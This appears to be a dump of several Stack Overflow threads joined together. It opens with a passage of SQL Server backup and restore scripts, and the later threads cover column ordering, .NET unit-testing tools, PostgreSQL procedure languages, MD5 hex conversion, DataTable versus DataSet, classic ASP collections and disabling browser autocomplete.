<pre><code><br>Declare @OldDB varchar(100)<br>Declare @NewDB varchar(100)<br>Declare @vchBackupPath varchar(255)<br>Declare @query varchar(8000)<br><br><br>/*Test code to implement <br>Select @OldDB = 'Pubs'<br>Select @NewDB = 'Pubs2'<br>Select @vchBackupPath = '\\dbserver\C$\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Backup\pubs.bak'<br>*/<br><br>SET NOCOUNT ON;<br><br>Select @query = 'Create Database ' + @NewDB<br>exec(@query)<br><br>Select @query = '<br>Declare @vBAKPath varchar(256)<br>declare @oldMDFName varchar(100)<br>declare @oldLDFName varchar(100)<br>declare @newMDFPath varchar(100)<br>declare @newLDFPath varchar(100)<br>declare @restQuery varchar(800)<br><br>select @vBAKPath = ''' + @vchBackupPath + '''<br>select @oldLDFName = name from ' + @OldDB +'.dbo.sysfiles where filename like ''%.ldf%''<br>select @oldMDFName = name from  ' + @OldDB +'.dbo.sysfiles where filename like ''%.mdf%''<br>select @newMDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''ROWS''<br>select @newLDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''LOG''<br><br>select @restQuery = ''RESTORE DATABASE ' + @NewDB + <br>' FROM DISK = N'' + '''''''' + @vBAKpath + '''''''' + <br>'' WITH MOVE N'' + '''''''' + @oldMDFName + '''''''' +  <br>'' TO N'' + '''''''' + @newMDFPath + '''''''' +  <br>'', MOVE N'' + '''''''' + @oldLDFName + '''''''' +  <br>'' TO N'' + '''''''' + @newLDFPath + '''''''' +  <br>'', NOUNLOAD, REPLACE, STATS = 10''<br><br>exec(@restQuery)<br>--print @restQuery'<br><br><br>exec(@query)<br><br><br><br><br><br></code></pre> <p>The <strong>Publish to Provider</strong> functionality has worked great for me.  See <a href=""http://weblogs.asp.net/scottgu/archive/2006/12/22/recipe-deploying-a-sql-database-to-a-remote-hosting-environment-part-1.aspx"" rel=""nofollow"">Scott Gu's Blog Entry</a>.</p>

<p>If you need something really robust look  at redgate software's tools <a href=""http://www.red-gate.com/"" rel=""nofollow"">here</a>...if you are doing much SQL at all, these are worth the $$.</p> <p>Backup and Restore is the most straight-forward way I know.  You have to be careful between servers as security credentials don't come with the restored database.</p> <pre><code>::================ BackUpAllMyDatabases.cmd ============= START
::BackUpAllMyDatabases.cmd
:: COMMAND LINE BATCH SCRIPT FOR TAKING BACKUP OF ALL DATABASES 

::RUN THE SQL SCRIPT VIA THE COMMAND LINE WITH LOGGING 
sqlcmd -S localhost -e  -i ""BackUpAllMyDatabases.sql"" -o Result_Of_BackUpAllMyDatabases.log

::VIEW THE RESULTS
Result_Of_BackUpAllMyDatabases.log

::pause
::================ BackUpAllMyDatabases.cmd ============= END


--=================================================BackUpAllMyDatabases.sql start
DECLARE @DBName varchar(255)

DECLARE @DATABASES_Fetch int

DECLARE DATABASES_CURSOR CURSOR FOR
    select
        DATABASE_NAME   = db_name(s_mf.database_id)
    from
        sys.master_files s_mf
    where
       -- ONLINE
        s_mf.state = 0 

       -- Only look at databases to which we have access
    and has_dbaccess(db_name(s_mf.database_id)) = 1 

        -- Not master, tempdb or model
    --and db_name(s_mf.database_id) not in ('Master','tempdb','model')
    group by s_mf.database_id
    order by 1

OPEN DATABASES_CURSOR

FETCH NEXT FROM DATABASES_CURSOR INTO @DBName

WHILE @@FETCH_STATUS = 0
BEGIN
    declare @DBFileName varchar(256)    
    set @DBFileName = @DbName + '_' + replace(convert(varchar, getdate(), 112), '-', '.') + '.bak'
--REMEMBER TO PUT HERE THE TRAILING \ FOR THE DIRECTORY !!!
    exec ('BACKUP DATABASE [' + @DBName + '] TO  DISK = N''D:\DATA\BACKUPS\' + 
        @DBFileName + ''' WITH NOFORMAT, INIT,  NAME = N''' + 
        @DBName + '-Full Database Backup'', SKIP, NOREWIND, NOUNLOAD,  STATS = 100')

    FETCH NEXT FROM DATABASES_CURSOR INTO @DBName
END

CLOSE DATABASES_CURSOR
DEALLOCATE DATABASES_CURSOR

--BackUpAllMyDatabases==========================end

--======================RestoreDbFromFile.sql start
-- Restore database from file
-----------------------------------------------------------------
use master
go

declare @backupFileName varchar(100), @restoreDirectory varchar(100),
@databaseDataFilename varchar(100), @databaseLogFilename varchar(100),
@databaseDataFile varchar(100), @databaseLogFile varchar(100),
@databaseName varchar(100), @execSql nvarchar(1000)

-- Set the name of the database to restore
set @databaseName = 'ReplaceDataBaseNameHere'
-- Set the path to the directory containing the database backup
set @restoreDirectory = 'ReplaceRestoreDirectoryHere' -- such as 'c:\temp\'

-- Create the backup file name based on the restore directory, the database name and today's date

@backupFileName = @restoreDirectory + @databaseName + '-' + replace(convert(varchar, getdate(), 110), '-', '.') + '.bak'


-- set @backupFileName = 'D:\DATA\BACKUPS\server.poc_test_fbu_20081016.bak'

-- Get the data file and its path
select @databaseDataFile = rtrim([Name]),
@databaseDataFilename = rtrim([Filename])
from master.dbo.sysaltfiles as files
inner join
master.dbo.sysfilegroups as groups
on

files.groupID = groups.groupID
where DBID = (
select dbid
from master.dbo.sysdatabases
where [Name] = @databaseName
)

-- Get the log file and its path
select @databaseLogFile = rtrim([Name]),
@databaseLogFilename = rtrim([Filename])
from master.dbo.sysaltfiles as files
where DBID = (
select dbid
from master.dbo.sysdatabases
where [Name] = @databaseName
)
and
groupID = 0

print 'Killing active connections to the ""' + @databaseName + '"" database'

-- Create the sql to kill the active database connections
set @execSql = ''
select @execSql = @execSql + 'kill ' + convert(char(10), spid) + ' '
from master.dbo.sysprocesses
where db_name(dbid) = @databaseName
and
DBID &lt;&gt; 0
and
spid &lt;&gt; @@spid
exec (@execSql)

print 'Restoring ""' + @databaseName + '"" database from ""' + @backupFileName + '"" with '
print ' data file ""' + @databaseDataFile + '"" located at ""' + @databaseDataFilename + '""'
print ' log file ""' + @databaseLogFile + '"" located at ""' + @databaseLogFilename + '""'

set @execSql = '
restore database [' + @databaseName + ']
from disk = ''' + @backupFileName + '''
with
file = 1,
move ''' + @databaseDataFile + ''' to ' + '''' + @databaseDataFilename + ''',
move ''' + @databaseLogFile + ''' to ' + '''' + @databaseLogFilename + ''',
norewind,
nounload,
replace'

exec sp_executesql @execSql

exec('use ' + @databaseName)
go

-- If needed, restore the database user associated with the database
/*
exec sp_revokedbaccess 'myDBUser'
go

exec sp_grantdbaccess 'myDBUser', 'myDBUser'
go

exec sp_addrolemember 'db_owner', 'myDBUser'
go

use master
go
*/
--======================RestoreDbFromFile.sql
</code></pre>
"
"Can I logically reorder columns in a table? <p>If I'm adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?</p>

<p>I don't want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.</p>

<p>I know that I can do this through SQL Management Studio by going into their ""design"" mode for tables and dragging the order of columns around, but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.</p>
 <P>You can not do this programatically (in a safe way that is) without creating a new table. </P>
<P>What Enterprise Manager does when you commit a reordering is to create a new table, move the data and then delete the old table and rename the new table to the existing name. </P>
<P>If you want your columns in a particular order/grouping without altering their physical order, you can create a view which can be whatever you desire.</P> <p>When Management Studio does it, it's creating a temporary table, copying everything across, dropping your original table and renaming the temporary table.  There's no simple equivalent T-SQL statement.</p>

<p>If you don't fancy doing that, you could always create a view of the table with the columns in the order you'd like and use that?</p>

<p>Edit: beaten!</p> <P>If I understand your question, you want to affect what columns are returned first, second, third, etc in <STRONG>existing</STRONG> queries, right?</P>
<P>If all of your queries are written with SELECT * FROM TABLE - then they will show up in the output as they are layed out in SQL. If your queries are written with SELECT Field1, Field2 FROM TABLE - then the order they are layed out in SQL does not matter.</P> <p>It can be done using SQL, by modifying the system tables directly. For example, look here:</p>

<p><a href=""http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=58912"" rel=""nofollow"">Alter table - Add new column in between</a></p>

<p>However, I would not recommend playing with system tables, unless it's absolutely necessary.</p>
 <p>I think what everyone here is missing, is that although not everyone has to deal with 10's, 20's, or 1000's instances of the same software system installed throughout the country and world ... those of us that design commercially sold software do so.  As a result, we expand systems over time, expand tables by adding fields as new capability is needed, and as those fields are identified do belong in an existing table, and as such, over a decade of expanding , growing, adding fields, etc to tables .... and then having to work with those tables from design, to support, to sometimes digging into raw data/troubleshooting to debug new functionality bugs .... it is incredibly aggravating to not have the primary information you want to see within the first handful of fields, when you may have tables with 30-40-50 or even 90 fields and yes in a strictly normalized database.</p>

<p>I've often wished I could do this, for this exact reason.  But short of doing exactly what SQL does, Building a Create Script for a new Table the way I want it, writing the Insert to it, then dropping all existing constraints, relationships, keys, index, etc etc etc from the existing table and renaming the ""new"" table back to the old name, and then reading all those keys, relationships, index, etc etc ....</p>

<p>Is not only tedious, time-consuming but ... in five more years, will need to happen again ....</p>

<p>It's so close to worth that massive amount of work, however the point is ... it won't be the last time we need this ability, since our systems will continue to grow, expand, and get fields in a wacked ordered driven by need/design additions.</p>

<p>A majority of developers think from a single system standpoint that serves a single company or very specific hard box market.</p>

<p>The ""off-the-shelf"" but significantly progressive designers and leaders of development in their market space will always have to deal with this problem, over and over.....would love a creative solution if any one has one.  This could easily save my company a dozen hours a week, just not having to scroll over, or remember where ""that"" field is in the source data table....</p>
 <p>There is one way, but its only temporarily for the query itself. For example, </p>

<p>Lets say you have 5 tables. 
Table is called <code>T_Testing</code></p>

<p>FirstName, LastName, PhoneNumber, Email, and Member_ID</p>

<p>you want it to list their ID, then Last Name, then FirstName, then Phone then Email. </p>

<p>You can do it as per the Select. </p>

<pre><code>Select Member_ID, LastName, FirstName, PhoneNumber, Email
From T_Testing
</code></pre>

<p>Other than that, if you just want the LastName to Show before first name for some reason, you can do it also as follows: </p>

<pre><code>Select LastName, *
From T_Testing
</code></pre>

<p>The only thing you wanna be sure that you do is that the OrderBy or Where Function needs to be denoted as Table.Column if you are going to be using a Where or OrderBy</p>

<p>Example: </p>

<pre><code>Select LastName, *
From T_Testing
Order By T_Testing.LastName Desc
</code></pre>

<p>I hope this helps, I figured it out because I needed to do this myself. </p>
 <ol>
<li>Script your existing table to a query window.</li>
<li>Run this script against a Test database (remove the Use statement)</li>
<li>Use SSMS to make the column changes you need</li>
<li>Click Generate Change Script (left most and bottommost icon on the
buttonbar, by default)</li>
<li>Use this script against your real table</li>
</ol>

<p>All the script really does is create a second table table with the desired column orders, copies all your data into it, drops the original table and then renames the secondary table to take its place. This does save you writing it yourself though should you want a deploy script.</p>
 <p>It is not possible to change the order of the columns without recreating the whole table. If you have a few instances of the database only, you can use SSMS for this (Select the table and click ""design"").</p>

<p>In case you have too many instances for a manual process, you should try this script:
<a href=""https://github.com/Epaminaidos/reorder-columns"" rel=""nofollow"">https://github.com/Epaminaidos/reorder-columns</a></p>
"
".NET Unit Testing packages? <p>Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.</p>

<p>I'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.</p>

<p>I realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)</p>

<p>Suggestions?</p>
 <p>I like <a href=""http://www.mbunit.com/"" rel=""nofollow"">MbUnit</a>, er, <a href=""http://www.gallio.org/"" rel=""nofollow"">Gallio</a>.  Most importantly to me is having good tools support inside Visual Studio.  For that I use <a href=""http://www.jetbrains.com/resharper/index.html"" rel=""nofollow"">Resharper</a>, which has an <a href=""http://code.google.com/p/mbunit-resharper/"" rel=""nofollow"">MbUnit test runner</a>.  A lot of folks seem to like <a href=""http://www.testdriven.net/overview.aspx"" rel=""nofollow"">TestDriven.NET</a> as their test runner as well.</p> <P>I like <A href=""http://www.testdriven.net/overview.aspx"" rel=""nofollow"">TestDriven.NET</A> (even though I use ReSharper) and I'm pretty happy with <A href=""http://www.codeplex.com/xunit"" rel=""nofollow"">XUnit.net</A>. It uses Facts instead of Tests which many people dislike but I like the difference in terminology. It's useful to think of a collection of automatically provable Facts about your software and see which ones you violate when you make a change.</P>
<P>Be aware that <A href=""http://blogs.msdn.com/buckh/archive/2007/03/27/orcas-unit-testing-to-be-available-in-visual-studio-professional.aspx"" rel=""nofollow"">Visual Studio 2008 Professional (and above) now comes with integrated Unit Testing</A> (it used to be available only with the Team System Editions) and may be suitable for your needs. </P> <p>There are so many it's crazy.  Crazy good, I guess.</p>

<ul>
<li>For the conservative types (me), <a href=""http://www.nunit.org/""><strong>NUnit</strong></a> is still available and still more than capable.</li>
<li>For the Microsoft-types, <a href=""http://msdn.microsoft.com/en-us/vstudio/default.aspx""><strong>MSTest</strong></a> is adequate, but slow and clunky compared to Nunit.  It also lacks code coverage without paying the big bucks for the pricey versions of Visual Studio.</li>
<li>There's also <a href=""http://www.mbunit.com/About.aspx""><strong>MbUnit</strong></a>.  It's like NUnit, but has nifty features like RowTest (run the same test with different parameters) and Rollback (put the database back like you found it after a test) </li>
<li>And finally, <a href=""http://www.codeplex.com/xunit""><strong>xUnit.net</strong></a> is the trendy option with some attitude.</li>
<li>Oh, and <a href=""http://testdriven.net/""><strong>TestDriven.NET</strong></a> will give you IDE integration for both Nunit and MBunit.</li>
</ul>

<p>I'm sure they're all just fine.  I'd steer away from MSTest though, unless you just enjoy the convenience of having everything in one IDE out of the box.</p>

<p><a href=""http://www.hanselminutes.com/default.aspx?showID=130"">Scott Hanselman</a> has a podcast on this very topic.</p>
 <p>xUnit.net looks like it provides a slightly different approach to N/MB/MS/Unit, which is interesting.</p>

<p>In my search for an rspec-like solution (because I LOVE the rspec), I also came across <a href=""http://nspec.tigris.org/"" rel=""nofollow"">NSpec</a>, which looks a bit wordy, but combined with the <a href=""http://code.google.com/p/nspec-extensions/"" rel=""nofollow"">NSpec Extensions</a> addon to use C#3 extension methods, it looks pretty nice.</p>
 <p>We use NUnit and <a href=""http://mbunit.com"" rel=""nofollow"">MBUnit</a> here. We use <a href=""http://testdriven.net"" rel=""nofollow"">TestDriven.NET</a> to run the unit tests from within Visual Studio. We use the excellent, highly recommended <a href=""http://www.ayende.com/projects/rhino-mocks/downloads.aspx"" rel=""nofollow"">RhinoMocks</a> as a mock framework.</p> <p>I used to use NUnit, but I switched to MbUnit since it has more features.  I love RowTest.  It lets you parametrize your tests.  NUnit does have a litter bit better tool support though.  I am using ReSharper to run MbUnit Tests.  I've had problems with TestDriven.NET running my SetUp methods for MbUnit.</p> <p>This is really a personal opinion on my part (I guess that's redundant since it is a forum). NUnit, MSTest, ect all do pretty mutch the same thing.  However I find NMock indispensable.</p>

<p>NMock or any mocking package is not unit testing but it makes it so much easier to do unit testing that it mught as well be.</p>
 <p>Stick to NUnit.  Don't go anywhere near MSTest.</p>

<p>NUnit + ReSharper is an absolute joy to work with.</p>
 <p>I used to use NUnit, but now tend to use MbUnit, for two key features:
1. The RowTest feature allows you to easily run the same test on different sets of parameters, which is important if you really want thorough coverage.
2. The Rollback feature allows you to run tests against your database while rolling back changes after every test, keeping your database in exactly the same state every time. And it's as easy as adding the [Rollback] attribute.</p>

<p>Another nice aspect of MbUnit is that its syntax is nearly identical to NUnit, so if you have a whole test bed already in place under NUnit, you can just switch out the references without the need to change any (very much?) code.</p>
 <p>I have made a small example of testing a .net lib using ironRuby:
<a href=""http://khebbie.dk/post/2008/08/Example-of-using-ironRubys-mini_rspec-library.aspx"" rel=""nofollow"">http://khebbie.dk/post/2008/08/Example-of-using-ironRubys-mini_rspec-library.aspx</a></p>
 <p>I use the following:</p>

<p><a href=""http://www.testdriven.net"" rel=""nofollow"">TestDriven.NET</a> - Unit Testing add on for Visual Studio </p>

<p><a href=""http://www.typemock.com"" rel=""nofollow"">Typemock Isolator</a>- Mocking framework for .Net Unit Testing</p>

<p><a href=""http://www.nunit.org"" rel=""nofollow"">NUnit</a> - An open source unit testing framework that is in C#.</p>
 <p>This is an old question but you might find it interesting that Gallio v3.1 now supports RSpec via IronRuby.</p>
"
"What language do you use for PostgreSQL triggers and stored procedures? <p>PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?</p>
 <p>When I wrote my first trigger it was in Perl because that was the language used in the example I found but the last triggers I wrote where in Python because I'm more comfortable with that.</p>

<p>I think programmer comfort is my main reason to choose python but I think Perl is still better supported.</p> <p>I have only really used PL/pgSQL, but that was because I needed a few stored procedures relatively fast and didn't want to add extra modules to the server.</p>

<p>Longer term, I would probably use PL/Perl or PL/Python, as I use perl for quick scripting and have been looking at python for a while now.</p>

<p>One thing I have found is that there is a lack of good documentation for that on the PostgreSQL site. The manuals were thorough as a reference, but did not work well as a tutorial to help show people how it should be done.</p>

<p>That, combined with a very good debugging environment, meant that my first experience of writing procedures involved looking at weird syntax errors for a long time.</p>

<p>If someone knows of a good site with tutorials etc for PostgreSQL programming, I would love to get a link to it.</p>
 <p>Skype uses <strong>PostgreSQL</strong> together with python, and they have improved PL/Python to it's current state so I would doubt that python support is far behind perl. They have written queuing/replication system on top of those bindings, after all :-) </p>

<p>Take a look: <a href=""http://wiki.postgresql.org/wiki/Skytools"" rel=""nofollow"">Wiki Skytools</a></p>

<blockquote>
  <p>From a quick look in documentation, python seems to have less
  documentation than perl bindings, but I would suggest to just stick
  with language you are most comfortable with.</p>
</blockquote>
 <p>I write pretty much everything in plpgsql, but I'm also a database guy first and foremost, so it generally suits me better than any other language. But there's plenty of things that it doesn't do very well, in which case another language such as plperl or plpython is a good bet. Of course, if speed is a serious concern, C is the way to go.</p>
 <p>For anything really small/simple or that doesn't require a lot of string manipulation or logic, I use plpgsql, because it's fast.  For more complex things, I use plperl, because I like it.</p>
 <p>PL/Ruby because I use Ruby every day anyway.</p>
 <p>I use PL/pgSQL for most everything, and if there is something it can't do I write functions in PL/Python (which rocks).  You can also use PL/Java, PL/Perl, PL/PHP.</p>

<p>I would say Python is probably the best all around one because Python is on just about every linux system. Perl would be second with Python beating it because of the easier reading syntax.</p>
 <p>I use PL/Perl because:</p>

<ul>
<li>I like Perl</li>
<li>It's a dynamic language, which means that you can do some useful tricks easy, i.e. passing a column name to a trigger function and doing some actions with the value of this column in a trigger tuple.</li>
<li>It has a <a href=""http://www.postgresql.org/docs/8.4/interactive/plperl.html"" rel=""nofollow"">pretty good documentation</a></li>
</ul>
"
"Convert HashBytes to VarChar <p>I want to get the MD5 Hash of a string value in SQL Server 2005. I do this with the following command:</p>

<pre><code>SELECT HashBytes('MD5', 'HelloWorld')
</code></pre>

<p>However, this returns a VarBinary instead of a VarChar value. If I attempt to convert <code>0x68E109F0F40CA72A15E05CC22786F8E6</code> into a VarChar I get <code>há ðô§*à\Â'†øæ</code> instead of <code>68E109F0F40CA72A15E05CC22786F8E6</code>.</p>

<p>Is there any SQL-based solution?</p>

<p><strong><a href=""http://stackoverflow.com/questions/2120/#2382"">Yes</a></strong></p>
 <p>I have found the solution else where:</p>

<pre><code>SELECT SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('MD5', 'HelloWorld')), 3, 32) <br></code></pre> <p>Changing the datatype to varbinary seems to work the best for me.</p>
 <pre><code>SELECT CONVERT(NVARCHAR(32),HashBytes('MD5', 'Hello World'),2)
</code></pre>


 <p>Use <code>master.dbo.fn_varbintohexsubstring(0, HashBytes('SHA1', @input), 1, 0)</code> instead of <code>master.dbo.fn_varbintohexstr</code> and then <code>substringing</code> the result.</p>

<p>In fact <code>fn_varbintohexstr</code> calls <code>fn_varbintohexsubstring</code> internally. The first argument of <code>fn_varbintohexsubstring</code> tells it to add <code>0xF</code> as the prefix or not. <code>fn_varbintohexstr</code> calls <code>fn_varbintohexsubstring</code> with <code>1</code> as the first argument internaly.</p>

<p>Because you don't need <code>0xF</code>, call <code>fn_varbintohexsubstring</code> directly.</p>
 <pre><code>convert(varchar(34), HASHBYTES('MD5','Hello World'),1)
</code></pre>

<p>(1 for converting hexadecimal to string)</p>

<p>convert this to lower and remove 0x from the start of the string by substring:</p>

<pre><code>substring(lower(convert(varchar(34), HASHBYTES('MD5','Hello World'),1)),3,32)
</code></pre>

<p>exactly the same as what we get in C# after converting bytes to string</p>
 <p>Contrary to what <a href=""http://stackoverflow.com/users/161332/david-knight"">David Knight</a> says, these two alternatives return the same response in MS SQL 2008:</p>

<pre><code>SELECT CONVERT(VARCHAR(32),HashBytes('MD5', 'Hello World'),2)
SELECT UPPER(master.dbo.fn_varbintohexsubstring(0, HashBytes('MD5', 'Hello World'), 1, 0))
</code></pre>

<p>So it looks like the first one is a better choice, starting from version 2008.</p>
 <p>With personal experience of using the following code within a Stored Procedure which Hashed a SP Variable I can confirm, although undocumented, this combination works 100% as per my example:</p>

<pre><code>@var=SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('SHA2_512', @SPvar)), 3, 128)
</code></pre>
"
"Datatable vs Dataset <p>I currently use a DataTable to get results from a database which I can use in my code.</p>

<p>However, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.</p>

<p>Is there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?</p>
 <p>in 1.x there used to be things DataTables couldn't do which DataSets could (don't remember exactly what). All that was changed in 2.x.  My guess is that's why a lot of examples still use DataSets.  DataTables should be quicker as they are more lightweight. If you're only pulling a single resultset, its your best choice between the two.</p> <p>It really depends on the sort of data you're bringing back.  Since a DataSet is (in effect) just a collection of DataTable objects, you can return multiple distinct sets of data into a single, and therefore more manageable, object.  </p>

<p>Performance-wise, you're more likely to get inefficiency from unoptimized queries than from the ""wrong"" choice of .NET construct.  At least, that's been my experience.</p>
 <p>One feature of the DataSet is that if you can call multiple select statements in your stored procedures, the DataSet will have one DataTable for each.</p> <p>There are some optimizations you can use when filling a DataTable, such as calling BeginLoadData(), inserting the data, then calling EndLoadData().  This turns off some internal behavior within the DataTable, such as index maintenance, etc.  See <a href=""http://www.objectsharp.com/cs/blogs/datasetfaq/archive/2004/04/18/367.aspx"" rel=""nofollow"">this article</a> for further details.</p>
 <p>On major difference is that DataSets can hold multiple tables and you can define relationships between those tables. </p>

<p>If you are only retuning a single result set though I would think a DataTable would be more optimized. I would think there has to be some overhead (granted small) to offer the functionality a DataSet does and keep track of multiple DataTables. </p>
"
"How do I traverse a collection in classic ASP? <P>I want to be able to do:</P><PRE><CODE>For Each thing In things
End For
</CODE></PRE>
<P>CLASSIC ASP - NOT .NET!</P> <p>Whatever your [things] are need to be written outside of VBScript.</p>

<p>In VB6, <a href=""http://www.vb-helper.com/howto_custom_collection_with_for_each.html"" rel=""nofollow"">you can write a Custom Collection class</a>, then you'll need to compile to an ActiveX DLL and register it on your webserver to access it.</p> <p>Something like this?</p>

<pre><code>dim cars(2),x
cars(0)=""Volvo""
cars(1)=""Saab""
cars(2)=""BMW""

For Each x in cars
  response.write(x &amp; ""&lt;br /&gt;"")
Next
</code></pre>

<p>See <a href=""http://www.w3schools.com/VBscript/vbscript_looping.asp"">www.w3schools.com</a>.</p>

<p>If you want to associate keys and values <a href=""http://www.4guysfromrolla.com/webtech/102898-1.shtml"">use a dictionary object</a> instead:</p>

<pre><code>Dim objDictionary
Set objDictionary = CreateObject(""Scripting.Dictionary"")
objDictionary.Add ""Name"", ""Scott""
objDictionary.Add ""Age"", ""20""
if objDictionary.Exists(""Name"") then
    ' Do something
else
    ' Do something else 
end if
</code></pre>
 <p>The closest you are going to get is using a Dictionary (as mentioned by Pacifika)</p>

<pre><code>Dim objDictionary
Set objDictionary = CreateObject(""Scripting.Dictionary"")
objDictionary.CompareMode = vbTextCompare 'makes the keys case insensitive'
objDictionary.Add ""Name"", ""Scott""
objDictionary.Add ""Age"", ""20""
</code></pre>

<p>But I loop through my dictionaries like a collection</p>

<pre><code>For Each Entry In objDictionary
  Response.write objDictionary(Entry) &amp; ""&lt;br /&gt;""
Next
</code></pre>

<p>You can loop through the entire dictionary this way writing out the values which would look like this:</p>

<pre><code>Scott
20
</code></pre>

<p>You can also do this</p>

<pre><code>For Each Entry In objDictionary
  Response.write Entry &amp; "": "" &amp; objDictionary(Entry) &amp; ""&lt;br /&gt;""
Next
</code></pre>

<p>Which would produce</p>

<pre><code> Name: Scott
 Age: 20
</code></pre>
 <p>As Brett said, its better to use a vb component to create collections. Dictionary objects are not very commonly used in ASP unless for specific need based applications. </p>
 <p>One approach I've used before is to use a property of the collection that returns an array, which can be iterated over.</p>

<pre><code>Class MyCollection
    Public Property Get Items
        Items = ReturnItemsAsAnArray()
    End Property
    ...
End Class
</code></pre>

<p>Iterate like:</p>

<pre><code>Set things = New MyCollection
For Each thing in things.Items
    ...
Next
</code></pre>
 <p>Be VERY carefully on using VB Script Dictionary Object!<br>
Just discover this ""<strong><em>autovivication</em></strong>"" thing, native on this object: <a href=""http://en.wikipedia.org/wiki/Autovivification"" rel=""nofollow"">http://en.wikipedia.org/wiki/Autovivification</a></p>

<p>So, when you need to compare values, NEVER use a boolen comparison like:<br>
<code>If objDic.Item(""varName"") &lt;&gt; """" Then</code>...<br>
This will <strong>automatically</strong> add the key ""<code>varName</code>"" to the dictionary (if it doesn't exist, with an empty value) , in order to carry on evaluating the boolean expression.</p>

<p>If needed, use instead <code>If objDic.Exists(""varName"")</code>.  </p>

<p>Just spend a few days knocking walls, with this Mcrosoft ""<em>feature</em>""...<br>
<a href=""http://social.technet.microsoft.com/Forums/scriptcenter/en-US/906ecc76-f0c2-4823-be2a-fb5eaf8179fd/vbscript-dictionary-object-creating-a-key-which-never-existed-but-present-in-another-object"" rel=""nofollow"">vbscript-dictionary-object-creating-a-key-which-never-existed-but-present-in-another-object</a></p>
"
"How do you disable browser Autocomplete on web form field / input tag? <p>How do you disable <code>autocomplete</code> in the major browsers for a specific <code>input</code> (or <code>form field</code>)?</p>
 <p>Firefox 30 ignores <code>autocomplete=""off""</code> for passwords, opting to prompt the user instead whether the password should be stored on the client. Note the following <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=956906#c100"">commentary</a> from May 5, 2014:</p>

<blockquote>
  <ul>
  <li>The password manager <em>always</em> prompts if it wants to save a password. Passwords are not saved without permission from the user.</li>
  <li>We are the third browser to implement this change, after IE and Chrome.</li>
  </ul>
</blockquote>

<p>According to <a href=""https://developer.mozilla.org/en/How_to_Turn_Off_Form_Autocompletion"">Mozilla developer documentation</a> the form element attribute <code>autocomplete</code> prevents form data from being cached in older browsers.</p>

<pre><code>&lt;input type=""text"" name=""foo"" autocomplete=""off"" /&gt;
</code></pre>
 <pre><code>&lt;form autocomplete=""off"" ...<br></code></pre>

<p>was a none standard way to do this (I think mozilla and IE still support it) but messing with the users expectations is normally a bad idea.  </p>

<p>If the user enters their credit card details into a form and then let's someone else use that browser it's not your concern :)</p> <p>Use a non-standard name and id for the fields, so rather than ""name"" have ""name_"". Browsers will then not see it as being the name field. The best part about it is that you can do this to some but not all fields and it will autocomplete some but not all fields.</p> <pre><code>&lt;form name=""form1"" id=""form1"" method=""post"" 
      autocomplete=""off"" action=""http://www.example.com/form.cgi""&gt;
</code></pre>

<p>This will work in IE and FF, the downside is that it is not XHTML standard.</p>
 <p>Just set <code>autocomplete=""off""</code>. There is a very good reason for doing this: You want to provide your own autocomplete functionality!</p>
 <p>On a related, or actually, on the completely opposite note - if you're the user of the aforementioned form and want to re-enable the autocomplete functionality, use the 'remember password' bookmarklet from this <a href=""https://www.squarefree.com/bookmarklets/forms.html"">bookmarklets page</a>. It removes all 'autocomplete=""off""' attributes from all forms on the page. Keep fighting the good fight!</p>
 <p>Why would you make your user's life less convenient?</p>

<p>""Passwords / credit card data / etc. should not be saved"" is a bad argument: with autocomplete on, browsers in Mac OS X store such values in an encrypted database with per-application permissions. Conversely, what's the realistic effect of <code>autocomplete=off</code>? The user is going to write it in an unencrypted text file, or better yet, on a post-it note attached to the screen.</p>

<p>Good thing there's bookmarklets like the one Antti mentioned, and <a href=""http://www.magicpubs.com/mac/software/autocomplete/"" rel=""nofollow"">patches to make the engine ignore the attribute altogether</a>.</p>

<p>Seriously, I urge you to reconsider using this attribute. It does <em>not</em> benefit anyone.</p>
 <p>We did actually use <em>sasb</em>'s idea for one site. It was a medical software web app to run a doctor's office. However, many of our clients were surgeons who used lots of different workstations, including semi-public terminals. So, they wanted to make sure that a doctor who doesn't understand the implication of auto-saved passwords or isn't paying attention can't accidentally leave their login info easily accessible. Of course, this was before the idea of private browsing that is starting to be featured in IE8, FF3.1, etc. Even so, many physicians are forced to use old school browsers in hospitals with IT that won't change.</p>

<p>So, we had the login page generate random field names that would only work for that post. Yes, it's less convenient, but it's just hitting the user over the head about not storing login information on public terminals.</p>
 <p>In addition to <code>autocomplete=off</code>, you could also have your form fields names be randomized by the code that generates the page, perhaps by adding some session-specific string to the end of the names.  When the form is submitted, you can strip that part <code>off</code> before processing them on the server side. This would prevent the web browser from finding context for your field and also might help prevent <strong>XSRF</strong> attacks because an attacker wouldn't be able to guess the field names for a form submission.</p>
 <p>As others have said, the answer is <code>autocomplete=""off""</code></p>

<p>However I think it's worth stating <strong>why</strong> it's a good idea to use this in certain cases as some answers to this and <a href=""http://stackoverflow.com/questions/471800/how-i-do-to-force-the-browser-to-not-store-the-html-form-field-data"">duplicate</a> questions have suggested it's better not to turn if off.</p>

<p>Stopping browsers storing credit card numbers shouldn't be left to users. Too many users won't even realise it's a problem.</p>

<p>It's particularly important to turn it off on fields for credit card security codes. As <a href=""http://www.mollerus.net/tom/blog/2007/05/my_best_practices_for_online_credit_card_security.html"">this page</a> states</p>

<blockquote>
  <p>""Never store the security code ... its value depends on the presumption that the only way to supply it is to read it from the physical credit card, proving that the person supplying it actually holds the card.""</p>
</blockquote>

<p>The problem is, if it's a public computer (cyber cafe, library etc) it's then easy for other users to steal your card details, and even on your own machine a malicious website could <a href=""http://webreflection.blogspot.com/2008/09/security-basis-and-internet-explorer.html"">steal autocomplete data</a>.</p>
